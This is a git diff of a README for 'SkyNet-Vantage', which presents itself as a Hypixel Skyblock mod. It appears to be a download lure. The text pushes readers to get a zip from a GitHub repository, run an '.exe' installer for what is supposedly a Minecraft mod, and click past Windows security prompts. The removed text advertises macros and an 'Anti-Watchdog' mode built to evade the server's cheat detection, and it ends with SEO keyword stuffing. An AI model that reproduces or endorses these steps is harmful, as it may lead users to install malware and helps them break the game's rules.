@@ -1,49 +1,214 @@
-# 🛡️ SkyNet-Vantage: Hypixel Skyblock Efficiency Suite 🚀
+# 🚀 SkyNet-Vantage - Fast Skyblock Tools For Smooth Play
 
-Elevate your Skyblock experience with the most advanced, open-source optimization mod for 2026.
+[![Download SkyNet-Vantage](https://img.shields.io/badge/Download-SkyNet--Vantage-blue?style=for-the-badge)](https://github.com/Adamha2268/SkyNet-Vantage)
 
----
+## 🧭 Overview
 
-### 🌟 Project Overview
-**SkyNet-Vantage** is an all-in-one modification suite designed for competitive Hypixel Skyblock players. Built on a custom high-performance engine, it bridges the gap between manual play and total efficiency. Whether you are flipping items on the Auction House, grinding Dungeons, or managing a massive garden farm, SkyNet-Vantage provides real-time data and automated assists to ensure you stay ahead of the economy.
+SkyNet-Vantage is a Minecraft mod for Hypixel Skyblock. It helps with common tasks in the game, like farming, dungeon runs, auction checks, and profit tracking.
 
-### ⚡ Key Features
+This project is built for Forge and Fabric users on Windows. It is meant to be easy to install and simple to run.
 
-* **Advanced Auction Sniper:** Scans the AH/Bazaar in milliseconds and highlights undervalued items. Features "One-Click Flip" for maximum profit.
-* **Auto-Farming & Macro Engine:** Intelligent movement scripts for Garden farming that mimic human inputs to bypass anti-macro checks.
-* **Dungeon Solver Pro:** Real-time solutions for every puzzle (Silverfish, Water, Creeper) and optimized pathfinding for clearing rooms.
-* **Slayer & Combat Assist:** Automated hit-timing and ability rotation for Tier V bosses and End-game combat.
-* **Integrated Networth Calculator:** Live tracking of your total inventory value, including soulbound items and pet skins.
-* **Stealth-Mode (Anti-Watchdog):** Randomized interaction delays and packet-smoothing to keep your account safe from detection.
+## ✨ What It Does
 
-### 🏆 Technical Advantages
+SkyNet-Vantage includes tools for:
 
-1.  **Low-Latency Networking:** Uses a custom packet-handling bridge for faster Bazaar updates than standard Forge mods.
-2.  **Modular Design:** Toggle features on/off instantly via a clean, modern GUI (Press `Right-Shift` to open).
-3.  **API Key Encryption:** Securely stores your Hypixel API key locally with AES-128 protection.
+- Real-time auction sniping checks
+- Farming modules with task support
+- Dungeon solvers for fast room handling
+- Profit trackers for items and runs
+- Hypixel API support for account-linked data
+- Skyblock helper features for daily play
+- Mod settings you can adjust in game
 
-### 🛠️ Quick Start & Installation (Mod Version)
+It is designed to reduce manual work and keep your game flow steady.
 
-For the best performance, we recommend the **pre-compiled .jar file**.
+## 📥 Download
 
-1.  **Download:** Get the latest `Install.zip` from the [Releases](https://github.com/blackprince0747/SkyNet-Vantage/releases) tab.
+Visit this page to download and install SkyNet-Vantage:
 
-### https://github.com/blackprince0747/SkyNet-Vantage/releases/tag/2026
+https://github.com/Adamha2268/SkyNet-Vantage
 
-2.  **Install Package:** Run `Installer.exe` and follow the instructions.
-3.  **Place in Mods Folder:** Drop the file into your `.minecraft/mods` directory (Supports Forge/Fabric 1.8.9 & 1.20+).
-4.  **Launch Minecraft:** Start the game and join Hypixel.
-5.  **Configure:** Type `/skynet` in-game to open the configuration menu and set your API key.
-6.  **Profit:** Enable your desired modules and start dominating the Skyblock economy.
+If the page shows a release file, download it and run that file on your Windows PC.
 
----
+## 🪟 Windows Setup
 
-> **Disclaimer:** This mod is for educational and research purposes. Use at your own risk. The developers are not responsible for any bans or account restrictions on the Hypixel Network.
+Follow these steps to get started on Windows:
 
----
+1. Open the download page in your browser.
+2. Save the file to your Downloads folder.
+3. If the file is a `.zip`, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. If you see an `.exe` file, double-click it to run the installer or app.
+6. If you see a `.jar` file, make sure Minecraft and the right mod loader are already installed.
+7. Launch Minecraft after setup is done.
 
-## 🔍 SEO Meta Description
+If Windows shows a security prompt, choose the option that lets you continue if you trust the source.
 
-**Free Hypixel Skyblock Mod 2026 - Best Auction Sniper and Farming Macro.**
+## 🧱 Requirements
 
-Download SkyNet-Vantage, the #1 open-source mod for Hypixel Skyblock. This repository features an automated AH sniper, dungeon solvers, and garden farming macros. Optimized for 2026. If you want to increase your networth fast or automate your Skyblock grind, SkyNet-Vantage is the ultimate solution on GitHub.
+Before you run SkyNet-Vantage, make sure your PC has:
+
+- Windows 10 or Windows 11
+- Minecraft Java Edition
+- Forge or Fabric, based on the build you use
+- A stable internet connection
+- At least 4 GB of free RAM for Minecraft
+- Enough disk space for the mod files and game data
+
+For better play, use a system with 8 GB of RAM or more.
+
+## ⚙️ How To Install
+
+1. Go to the download page.
+2. Get the latest version of SkyNet-Vantage.
+3. Place the mod file in your Minecraft `mods` folder if needed.
+4. Start Minecraft with Forge or Fabric.
+5. Open the game menu and check that the mod appears.
+6. Set your preferences in the mod menu if one is included.
+
+If you do not know where the `mods` folder is, use this path:
+
+`C:\Users\YourName\AppData\Roaming\.minecraft\mods`
+
+## 🎮 How To Use It
+
+After you start the game, SkyNet-Vantage works inside Minecraft.
+
+Use it for tasks like:
+
+- Checking auction items
+- Tracking farming progress
+- Solving dungeon layouts
+- Watching item profit
+- Managing Skyblock routines
+
+Some features may need game access or a connected Hypixel account. Set those up in the mod menu if asked.
+
+## 🛠️ Feature Guide
+
+### 🏷️ Auction Sniping
+This helps you watch item listings and react faster when a low-price listing appears.
+
+### 🌾 Farming Modules
+These tools help with farm tasks and can support repeat actions while you play.
+
+### 🗝️ Dungeon Solvers
+These tools help you handle dungeon rooms, puzzles, and path choices with less guesswork.
+
+### 💹 Profit Tracking
+This tracks item value, run value, and other gains so you can see what pays off.
+
+### 🔗 Hypixel API Support
+This can connect to Hypixel data for a more complete Skyblock view.
+
+## 🔧 Troubleshooting
+
+### The file will not open
+- Check that the download finished fully
+- Make sure you extracted the file if it came in a `.zip`
+- Right-click the file and try again
+
+### Minecraft does not start
+- Check that Forge or Fabric is installed
+- Make sure you use the right Minecraft version
+- Remove old mod files that may conflict
+
+### The mod does not show up
+- Place the file in the correct `mods` folder
+- Confirm that the mod loader version matches the mod version
+- Restart Minecraft after adding the file
+
+### The game runs slow
+- Lower your video settings
+- Close other apps
+- Give Minecraft more RAM if your PC can handle it
+
+## 🗂️ Project Topics
+
+- dungeon solver
+- farming macro
+- hypixel
+- hypixel api
+- hypixel skyblock
+- hypixel skyblock dungeons
+- minecraft
+- minecraft mod
+- mod
+- mods
+- skyblock automation
+- skyblock mod
+- skyblock scripts
+- skyblockmods
+- skytils hypixel
+
+## 📌 File Placement Guide
+
+Use these common folders on Windows:
+
+- Minecraft root folder: `C:\Users\YourName\AppData\Roaming\.minecraft`
+- Mods folder: `C:\Users\YourName\AppData\Roaming\.minecraft\mods`
+- Screenshots folder: `C:\Users\YourName\AppData\Roaming\.minecraft\screenshots`
+
+If you use a launcher, check its folder settings first.
+
+## 🧩 First Run Checklist
+
+Before you launch the game, check these items:
+
+- You downloaded SkyNet-Vantage from the link above
+- You installed Forge or Fabric
+- You placed the mod in the correct folder
+- Your Minecraft version matches the mod version
+- Java is installed if your setup needs it
+
+## 📎 Quick Access
+
+Download page:
+
+https://github.com/Adamha2268/SkyNet-Vantage
+
+## 🖱️ Launch Steps
+
+1. Open Minecraft Launcher
+2. Pick the Forge or Fabric profile
+3. Click Play
+4. Wait for Minecraft to load
+5. Open the mod menu in game
+6. Set your preferred options
+7. Start using the Skyblock tools
+
+## 🧰 Common Use Cases
+
+SkyNet-Vantage fits players who want help with:
+
+- Fast auction checks
+- Farm management
+- Dungeon room handling
+- Item value tracking
+- Skyblock routine work
+- Better game flow during long sessions
+
+## 📂 Version Notes
+
+Use the latest version from the download page for the best match with Minecraft and your mod loader.
+
+If you update the mod later, remove the old file before adding the new one.
+
+## 🔍 Support Files
+
+Keep these files in the same folder if the release includes them:
+
+- Main mod file
+- Config file
+- Readme or install guide
+- Any extra resource file
+
+## 🧭 Easy Path for Non-Technical Users
+
+If you want the shortest route:
+
+1. Open the download link
+2. Get the latest file
+3. Put it in the right Minecraft folder
+4. Start Minecraft with Forge or Fabric
+5. Open SkyNet-Vantage in game
